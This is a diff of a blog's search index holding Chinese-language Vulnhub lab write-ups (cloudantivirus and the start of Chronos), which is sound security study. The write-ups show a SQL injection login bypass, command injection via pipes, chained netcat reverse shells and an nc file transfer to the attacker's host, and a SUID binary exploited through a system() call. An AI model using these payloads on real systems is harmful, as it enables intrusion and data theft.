-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160607.png" /></p>
-<p>成功提权到root！接下来获取第二个flag<code>/root/root.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160550.png" /></p>
-<p>其实也可以通过<code>/usr/bin/cat</code>直接读取flag。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160915.png" /></p>
-<p>本台靶机到此结束！</p>
-<h1 id="总结">总结</h1>
-<p>该靶机的难度主要在于<strong>破壳漏洞</strong>的发现以及 <strong>GTFOBins漏洞</strong>利用。练习这么多个靶机以来第一次碰到这样的漏洞以及利用方式。</p>
-<p>还有一点，就是如果发现目标站点使用的是开源的框架，可以尝试以下默认的账号和密码。</p>
-]]></content>
-      <tags>
-        <tag>综合</tag>
-        <tag>vulnhub</tag>
-        <tag>破壳漏洞</tag>
-        <tag>开源源码泄露</tag>
-        <tag>GTFOBins提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2. Vulnhub cloudantivirus writeup</title>
-    <url>/2022/03/29/2.%20Vulnhub%20cloudantivirus%20writeup/</url>
-    <content><![CDATA[<p>该靶机难度简单。</p>
-<span id="more"></span>
-<h1 id="靶机信息">靶机信息</h1>
-<p>靶机地址：https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</p>
-<p>难度：Easy</p>
-<p>虚拟机软件：Virtual Box</p>
-<h1 id="网卡配置">网卡配置</h1>
-<p>查看 <strong>第一周</strong> 的信息。 攻击主机 kali：<code>192.168.137.104</code></p>
-<h1 id="渗透">渗透</h1>
-<h2 id="主机发现">主机发现</h2>
-<p>可以使用 <code>sudo arp-scan -l</code>，也可以使用 <code>arping</code> 。后者速度慢，效率低，但是有一个好处就是后者是一个<strong>网络工具</strong>，而前者是一个<strong>黑客工具</strong>，这就意味着大部分Linux都会装前者，而只有kali这种的才会装后者。因此，在内网渗透的时候目标主机可能没有前者，这时候就能使用后者了。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 254);do sudo arping -c 2 192.168.137.$i;done</span><br></pre></td></tr></table></figure>
-<p>与 ping 类似，一次只能扫描一个IP。<code>-c</code> 后面的参数指的是每个IP的发包次数。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204936.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204715.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204836.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204826.png" /></p>
-<p><code>192.168.137.100</code> 是主机在这个网段的IP；<code>192.168.137.1</code> 是网关；<code>192.168.137.104</code> 是kali IP；那么<code>192.168.137.103</code> 就是目标靶机了。</p>
-<p>从扫描结果也可以看出这个工具并不会将本机主机当作存活主机！</p>
-<h2 id="端口扫描">端口扫描</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329205256.png" /></p>
-<h2 id="端口服务发现">端口服务发现</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,8080 -sV 192.168.137.103</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329205415.png" /></p>
-<ol type="1">
-<li>22端口上的服务是 openssh</li>
-<li>靶机系统为 Ubuntu</li>
-<li>8080端口的服务是 http，信息与第1周一样</li>
-<li>靶机上存在着 python2 环境</li>
-</ol>
-<h2 id="访问-http-服务">访问 http 服务</h2>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211057.png" /></p>
-<p>接下来，当然要进行<strong>目录扫描</strong>，结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211439.png" /></p>
-<p>有一个 <code>/console</code>，打开如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211506.png" /></p>
-<p>这边暂时没有头绪，先放着，去测试一下网页的功能点。</p>
-<p>接下来要用 burp 抓包，所以先设置一下代理，将浏览器的代理设置为如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211629.png" /></p>
-<p>端口其实可以设置为其他的，只要和 burp 中的保持一致即可。</p>
-<p>发现需要输入验证码，这里可能存在注入点，<strong>先用burp fuzz 一下键盘上的特殊字符</strong>。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212320.png" /></p>
-<p>发现当输入双引号的时候出现了不一样的提示：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212405.png" /></p>
-<p>从这报错信息中可以看到：</p>
-<ol type="1">
-<li>路径信息</li>
-<li>模板为 flask</li>
-<li>存在 sql 注入语句，闭合方式为双引号</li>
-</ol>
-<h2 id="sql-注入">sql 注入</h2>
-<p>根据 sql 查询语句构造如下 payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or 1=1-- </span><br><span class="line">最后面有一个空格！！！</span><br></pre></td></tr></table></figure></p>
-<p>成功进入！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212626.png" /></p>
-<p>观察这些文件，发现这跟在命令行执行 <code>ls -l</code> 返回的结果很像。并且这是一个云反病毒的程序，因此我们输入文件名之后，后台肯定执行了某条命令，假设为 <code>cloudav filename</code> 。我们知道 Linux 系统中可以一次性执行多条命令，方式有很多，可以通过 <code>|</code>, <code>||</code>, <code>&amp;</code>, <code>&amp;&amp;</code>, <code>;</code> 等符号的帮忙做到，这里选用管道符，输入如下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|id</span><br></pre></td></tr></table></figure></p>
-<p>发现确实可以执行，因此，接下来就可以考虑弹shell了。</p>
-<h2 id="反弹-shell">反弹 shell</h2>
-<p>第一周中使用的是 python 反弹，这里的环境与第一周一样，也是可以用 python 的。但是由于现在属于学习阶段，因此就使用不同的办法，这里使用 <code>nc</code>。</p>
-<p>在kali上启动监听： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
-<p>王爷输入命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|nc 192.168.137.104 4444 -e /bin/bash</span><br></pre></td></tr></table></figure></p>
-<p>这里发现kali并没有。这是因为， <code>-e</code> 这个参数不是所有的 <code>nc</code> 版本都有，可以使用 <code>which nc</code> 查看对方主机是否有 <code>nc</code> ，如果有的话则说明，不存在 <code>-e</code> 操作。这里执行 <code>hello|which nc</code> 弹出信息 <code>/bin/nc</code> 说明对方主机存在 <code>nc</code> 但是没有参数 <code>-e</code>。</p>
-<p>此时可以使用 <strong>nc串联</strong>！！！操作如下：</p>
-<p>第一步，kali 开两个命令行窗口分别监听： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. nc -lvnp 3333</span><br><span class="line">2. nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
-<p>第二步，网页输入命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|nc 192.168.137.104 3333|/bin/sh|nc 192.168.137.104 4444</span><br></pre></td></tr></table></figure></p>
-<p>解释一下这个意思：</p>
-<blockquote>
-<p>首先得知道管道符的作用。举个例子，<code>cmd1|cmd2</code>，在这里cmd1执行完之后将结果作为参数传入cmd2（至于cmd2用不用就是得看cmd2本身需不需传参）。现在来解释一下那句命令，假设kali输入命令 <code>ls</code>，然后通过3333端口到达靶机，靶机通过<code>nc 192.168.137.104 3333</code>接收到后将命令通过管道符传给 <code>/bin/sh</code>，shell执行完命令<code>ls</code>后，将结果通过<code>nc 192.168.137.104 4444</code>传入到kali，kali监听4444端口，得到<code>ls</code>执行的结果。</p>
-</blockquote>
-<p>结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329215902.png" /></p>
-<p>查看 id 发现是 scanner，不是 root。因此，接下来就需要提权。</p>
-<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
-<p>第一周用的是<strong>内核漏洞提权</strong>，本周换一个办法。</p>
-<p>现在靶机上进行信息收集，看到了 <code>templates</code>，根据之前收集到的信息，这应该是 <code>flask</code> 搭建的模板文件。对我们的提权没有作用，注意到有一个 <code>.sql</code> 文件，这是数据库的文件，查看一下是否有账号和密码这些隐私。</p>
-<p>利用 <code>file database.sql</code> 发现打不开，后来发现是因为靶机上没有 <code>sqlite</code>，至于为什么是 sqlite，这是因为 sql 注入的报错信息提示的。那么就将这个文件发到kali上打开。</p>
-<p>kali打开监听器： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; db.sql</span><br></pre></td></tr></table></figure></p>
-<p>靶机输入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.137.104 5555 &lt; dabase.sql</span><br></pre></td></tr></table></figure></p>
-<p>一段时间（保证文件传输完毕）后手动断开连接，接着打开该文件： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sqlite3</span><br><span class="line">2. .open db.sql</span><br><span class="line">3. .database</span><br><span class="line">4. .dump</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329221819.png" /></p>
-<p>此时获得了密码，接下来可以尝试一下获取和 shell 有关的账号，然后与这些密码组合进行爆破攻击。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep /bin/bash</span><br></pre></td></tr></table></figure></p>
-<p>发现有三个账号。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329222213.png" /></p>
-<p>接下来将用户名保存为一个文件，密码为另一个文件，然后使用 <code>hydra</code> 爆破 ssh。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -p passwd.txt ssh://192.168.137.103</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329222931.png" /></p>
-<p>发现爆破没有成功的。这件事告诉我们，有时候自认为很有用的密码，并没有什么用。错误没什么可怕的，可怕的是不敢尝试！</p>
-<p>一个小秘密，上面搜集的密码可以用来登录之前 sql 注入的地方。</p>
-<p>接下来想想还有什么办法可以提权？对了，<strong><code>SUID</code> 提权</strong>也是Linux本地提权常用的一种办法。</p>
-<blockquote>
-<p>某个程序如果具有 suid 的权限，那么这台主机上的任何用户执行该程序都将默认继承该程序属主的权限。如果属主是root，那么该程序就是用root权限执行的，那么就可以想办法利用该程序去获得shell。</p>
-</blockquote>
-<p>发现该目录下并没有suid权限的程序，往上一个目录查找，发现！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329223319.png" /></p>
-<p>注意中间那个程序最前面有一个 <code>s</code>。这就是 suid 权限的标志！！！然后注意到下面还有一个.c文件，这应该就是源码了，查看源码： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *freshclam=<span class="string">&quot;/usr/bin/freshclam&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *command = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(freshclam) + <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="number">2</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(command, <span class="string">&quot;%s %s&quot;</span>, freshclam, argv[<span class="number">1</span>]);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(command);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>解释一下该源码，从<code>argv[1]</code>看出该程序接收一个参数，并且这个参数和 <code>freshclam</code> 构成一个<code>command</code>，然后 <code>system(command)</code> 执行 命令。因此，我们能够控制的就是 <code>argv[1]</code> 这个参数。</p>
-<p>kali再开两个命令行窗口，然后分别执行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. nc -lvnp 5555</span><br><span class="line">2. nc -lvnp 6666</span><br></pre></td></tr></table></figure></p>
-<p>靶机执行如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./update_cloudav &quot;a|nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666&quot;</span><br></pre></td></tr></table></figure></p>
-<p>注意，（<strong>一定要在最前面加上|,就算没有a，也要有|</strong>）这样构成的命令就是这样： <code>/usr/bin/freshclam a|nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666</code>，这是一个完整的命令，是可以被执行的。</p>
-<p>如果前面没有|，则构成<code>/usr/bin/freshclam nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666</code>，会先执行 <code>/usr/bin/freshclam nc 192.168.137.104 5555</code>，这样子nc串联就断开了，无法获得shell。</p>
-<p>最终成功获得 root 权限！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329225809.png" /></p>
-<h1 id="总结">总结</h1>
-<p>通过对该虚拟机的渗透，学到了：</p>
-<ol type="1">
-<li><code>arping</code> 进行主机发现</li>
-<li>nc串联反弹shell</li>
-<li>suid提权</li>
-</ol>
-<p>疑点：访问 http 服务那有一个地方需要输入 pin 码，还没找到</p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>综合</tag>
-        <tag>vulnhub</tag>
       </tags>
   </entry>
   <entry>
@@ -816,130 +695,117 @@
       </tags>
   </entry>
   <entry>
-    <title>3. Vulnhub Chronos Writeup</title>
-    <url>/2022/04/01/3.%20Vulnhub%20Chronos%20Writeup/</url>
+    <title>2. Vulnhub cloudantivirus writeup</title>
+    <url>/2022/03/29/2.%20Vulnhub%20cloudantivirus%20writeup/</url>
     <content><![CDATA[<p>该靶机难度简单。</p>
 <span id="more"></span>
 <h1 id="靶机信息">靶机信息</h1>
-<p>靶机地址：https://www.vulnhub.com/entry/chronos-1,735/</p>
+<p>靶机地址：https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</p>
 <p>难度：Easy</p>
 <p>虚拟机软件：Virtual Box</p>
-<p>目标：取得2个flag，获得root权限</p>
-<p>涉及的攻击方法：</p>
-<ul>
-<li>端口扫描</li>
-<li>web侦察</li>
-<li>命令注入</li>
-<li>数据编、解码</li>
-<li><strong>搜索大法</strong></li>
-<li><strong>框架漏洞利用</strong></li>
-<li>代码审计</li>
-<li>NC串联</li>
-<li>本地提权</li>
-</ul>
+<h1 id="网卡配置">网卡配置</h1>
+<p>查看 <strong>第一周</strong> 的信息。 攻击主机 kali：<code>192.168.137.104</code></p>
 <h1 id="渗透">渗透</h1>
-<p>攻击主机 kali：<code>192.168.137.104</code></p>
 <h2 id="主机发现">主机发现</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.137.0/16 </span><br><span class="line"></span><br><span class="line">如果实际的子网掩码是24位，那么上面查询的时候就减8，也就是16。实际查询的子网掩码位数设置为实际的子网掩码位数减8效果最好。</span><br></pre></td></tr></table></figure>
-<p>原理：与前面的两者相同，都是通过ARP解析</p>
-<p>结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113217.png" /></p>
-<p>因此，靶机的IP为 192.168.137.105</p>
+<p>可以使用 <code>sudo arp-scan -l</code>，也可以使用 <code>arping</code> 。后者速度慢，效率低，但是有一个好处就是后者是一个<strong>网络工具</strong>，而前者是一个<strong>黑客工具</strong>，这就意味着大部分Linux都会装前者，而只有kali这种的才会装后者。因此，在内网渗透的时候目标主机可能没有前者，这时候就能使用后者了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 254);do sudo arping -c 2 192.168.137.$i;done</span><br></pre></td></tr></table></figure>
+<p>与 ping 类似，一次只能扫描一个IP。<code>-c</code> 后面的参数指的是每个IP的发包次数。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204936.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204715.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204836.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204826.png" /></p>
+<p><code>192.168.137.100</code> 是主机在这个网段的IP；<code>192.168.137.1</code> 是网关；<code>192.168.137.104</code> 是kali IP；那么<code>192.168.137.103</code> 就是目标靶机了。</p>
+<p>从扫描结果也可以看出这个工具并不会将本机主机当作存活主机！</p>
 <h2 id="端口扫描">端口扫描</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113352.png" /></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329205256.png" /></p>
 <h2 id="端口服务发现">端口服务发现</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 192.168.137.105</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113546.png" /></p>
-<p>信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,8080 -sV 192.168.137.103</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329205415.png" /></p>
 <ol type="1">
-<li>22端口上的服务为openssh</li>
-<li>80端口上的服务为http，版本为 2.4.29</li>
-<li>8000端口上的服务也是http，但是用的 <code>node.js express framework</code></li>
-<li>系统为Ubuntu</li>
+<li>22端口上的服务是 openssh</li>
+<li>靶机系统为 Ubuntu</li>
+<li>8080端口的服务是 http，信息与第1周一样</li>
+<li>靶机上存在着 python2 环境</li>
 </ol>
-<h2 id="访问http服务">访问http服务</h2>
-<p>有三件事必须做：</p>
+<h2 id="访问-http-服务">访问 http 服务</h2>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211057.png" /></p>
+<p>接下来，当然要进行<strong>目录扫描</strong>，结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211439.png" /></p>
+<p>有一个 <code>/console</code>，打开如下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211506.png" /></p>
+<p>这边暂时没有头绪，先放着，去测试一下网页的功能点。</p>
+<p>接下来要用 burp 抓包，所以先设置一下代理，将浏览器的代理设置为如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211629.png" /></p>
+<p>端口其实可以设置为其他的，只要和 burp 中的保持一致即可。</p>
+<p>发现需要输入验证码，这里可能存在注入点，<strong>先用burp fuzz 一下键盘上的特殊字符</strong>。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212320.png" /></p>
+<p>发现当输入双引号的时候出现了不一样的提示：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212405.png" /></p>
+<p>从这报错信息中可以看到：</p>
 <ol type="1">
-<li>抓包</li>
-<li>看源码</li>
-<li>扫目录</li>
+<li>路径信息</li>
+<li>模板为 flask</li>
+<li>存在 sql 注入语句，闭合方式为双引号</li>
 </ol>
-<p>发现80端口和8000端口很类似（一个朴素，一个华丽），源码是一样的，其中有一串特殊的字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _0x5bdf=[&#x27;150447srWefj&#x27;,&#x27;70lwLrol&#x27;,&#x27;1658165LmcNig&#x27;,&#x27;open&#x27;,&#x27;1260881JUqdKM&#x27;,&#x27;10737CrnEEe&#x27;,&#x27;2SjTdWC&#x27;,&#x27;readyState&#x27;,&#x27;responseText&#x27;,&#x27;1278676qXleJg&#x27;,&#x27;797116soVTES&#x27;,&#x27;onreadystatechange&#x27;,&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;,&#x27;User-Agent&#x27;,&#x27;status&#x27;,&#x27;1DYOODT&#x27;,&#x27;400909Mbbcfr&#x27;,&#x27;Chronos&#x27;,&#x27;2QRBPWS&#x27;,&#x27;getElementById&#x27;,&#x27;innerHTML&#x27;,&#x27;date&#x27;];(function(_0x506b95,_0x817e36)&#123;var _0x244260=_0x432d;while(!![])&#123;try&#123;var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;catch(_0x3fb1dc)&#123;_0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9)&#123;return _0x432d=function(_0x5bdf82,_0x432dc8)&#123;_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;&#125;,_0x432d(_0x16bd66,_0x33ffa9);&#125;function loadDoc()&#123;var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function()&#123;var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&amp;&amp;this[_0x146f5d(0x8c)]==0xc8&amp;&amp;(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);&#125;,_0x2beb35[_0x17df92(0x81)](&#x27;GET&#x27;,_0x17df92(0x8a),!![]),_0x2beb35[&#x27;setRequestHeader&#x27;](_0x17df92(0x8b),_0x1cff55),_0x2beb35[&#x27;send&#x27;]();&#125;</span><br></pre></td></tr></table></figure></p>
-<p>乍一看，好像是加密的js代码。这里推荐一个网址，可以对代码进行美化和编码解码：https://gchq.github.io/CyberChef/</p>
-<p>利用<code>javascript beautify</code>模块美化之后虽然看的很清楚了，但是因为各种参数都加密了还是无法直到这段代码的意思。但是其中有一串字符没有加密： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure></p>
-<p>最后，抓包看一下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401114650.png" /></p>
-<p>发现确实有数据包往 chronos.local:8000 地方发送，但是我们无法用浏览器直接访问，因为kali并不知道chronos.local是哪台主机，但是我们知道，这应该就是靶机。因此，修改<code>/etc/hosts</code>，添加一条记录：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120624.png" /></p>
-<p>然后可以访问了，并且页面发生了变化。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120700.png" /></p>
-<p>结合url分析，发现url中的那一串字符像是警告base64编码的，因此，再次利用刚刚的网址进行解码。利用 <code>magic</code> 模块进行解码，发现是base58编码。得到解码后的结果：<code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></p>
+<h2 id="sql-注入">sql 注入</h2>
+<p>根据 sql 查询语句构造如下 payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or 1=1-- </span><br><span class="line">最后面有一个空格！！！</span><br></pre></td></tr></table></figure></p>
+<p>成功进入！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212626.png" /></p>
+<p>观察这些文件，发现这跟在命令行执行 <code>ls -l</code> 返回的结果很像。并且这是一个云反病毒的程序，因此我们输入文件名之后，后台肯定执行了某条命令，假设为 <code>cloudav filename</code> 。我们知道 Linux 系统中可以一次性执行多条命令，方式有很多，可以通过 <code>|</code>, <code>||</code>, <code>&amp;</code>, <code>&amp;&amp;</code>, <code>;</code> 等符号的帮忙做到，这里选用管道符，输入如下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|id</span><br></pre></td></tr></table></figure></p>
+<p>发现确实可以执行，因此，接下来就可以考虑弹shell了。</p>
+<h2 id="反弹-shell">反弹 shell</h2>
+<p>第一周中使用的是 python 反弹，这里的环境与第一周一样，也是可以用 python 的。但是由于现在属于学习阶段，因此就使用不同的办法，这里使用 <code>nc</code>。</p>
+<p>在kali上启动监听： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
+<p>王爷输入命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|nc 192.168.137.104 4444 -e /bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>这里发现kali并没有。这是因为， <code>-e</code> 这个参数不是所有的 <code>nc</code> 版本都有，可以使用 <code>which nc</code> 查看对方主机是否有 <code>nc</code> ，如果有的话则说明，不存在 <code>-e</code> 操作。这里执行 <code>hello|which nc</code> 弹出信息 <code>/bin/nc</code> 说明对方主机存在 <code>nc</code> 但是没有参数 <code>-e</code>。</p>
+<p>此时可以使用 <strong>nc串联</strong>！！！操作如下：</p>
+<p>第一步，kali 开两个命令行窗口分别监听： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. nc -lvnp 3333</span><br><span class="line">2. nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
+<p>第二步，网页输入命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|nc 192.168.137.104 3333|/bin/sh|nc 192.168.137.104 4444</span><br></pre></td></tr></table></figure></p>
+<p>解释一下这个意思：</p>
 <blockquote>
-<p>base系列有许多，但是常见的是base64和base32。还有许多不常见的，比如这里的base58。</p>
+<p>首先得知道管道符的作用。举个例子，<code>cmd1|cmd2</code>，在这里cmd1执行完之后将结果作为参数传入cmd2（至于cmd2用不用就是得看cmd2本身需不需传参）。现在来解释一下那句命令，假设kali输入命令 <code>ls</code>，然后通过3333端口到达靶机，靶机通过<code>nc 192.168.137.104 3333</code>接收到后将命令通过管道符传给 <code>/bin/sh</code>，shell执行完命令<code>ls</code>后，将结果通过<code>nc 192.168.137.104 4444</code>传入到kali，kali监听4444端口，得到<code>ls</code>执行的结果。</p>
 </blockquote>
-<ol type="1">
-<li>date</li>
-<li><code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></li>
-<li>页面上显示的时间信息</li>
-</ol>
-<p>这让我想到Linux中的date命令，也是能够显示时间，因此在kali上尝试一下如下代码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401121236.png" /></p>
-<p>发现结果和页面显示的一模一样（未经过渲染）。因此，有理由怀疑后台服务调用了系统命令，并且后台代码可能如下（猜测，并不是真正的代码，只是说明代码逻辑）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;date&#x27; .$format;</span><br><span class="line">system(cmd);</span><br></pre></td></tr></table></figure></p>
-<p>如果我们什么都不修改，那么执行的命令就是<code>date '+Today is %A, %B %d, %Y %H:%M:%S.'</code>，因此，我们可以考虑到Linux中以下执行多条命令（上周使用的是管道符，这周使用 <code>$$</code>，该符号只有在前面的命令正确执行的情况下，才会执行后面的命令）</p>
-<p>先做一个尝试， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;ls -&gt; yZSGA</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401134641.png" /></p>
-<p>成功执行，因此这里确实调用了系统命令。接下来使用nc串联来反弹shell（先判断是否有nc，然后再判断是否有 -e）</p>
-<h2 id="反弹shell">反弹shell</h2>
